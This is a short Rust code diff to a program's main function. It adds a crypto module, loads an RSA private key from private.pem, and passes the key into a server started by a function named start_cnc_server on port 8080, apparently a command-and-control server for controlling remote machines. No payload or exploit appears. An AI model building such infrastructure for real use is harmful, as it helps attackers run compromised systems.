@@ -4,6 +4,7 @@ use tokio::signal;
 
 mod server;
 mod socket;
+mod crypto;
 
 const IP: &'static str = "0.0.0.0";
 const PORT: u16 = 8080;
@@ -12,8 +13,11 @@ const PORT: u16 = 8080;
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Welcome to imperialshag :)");
     println!("Starting TCP server.");
-    let server = Arc::new(Mutex::new(server::Server::new()));
+    
+    let rsa_private_key = crypto::load_private_rsa("private.pem").await.unwrap();
 
+    let server = Arc::new(Mutex::new(server::Server::new(rsa_private_key)));
+    
     server::start_cnc_server(IP, PORT, &server).await?;
 
     signal::ctrl_c().await?;
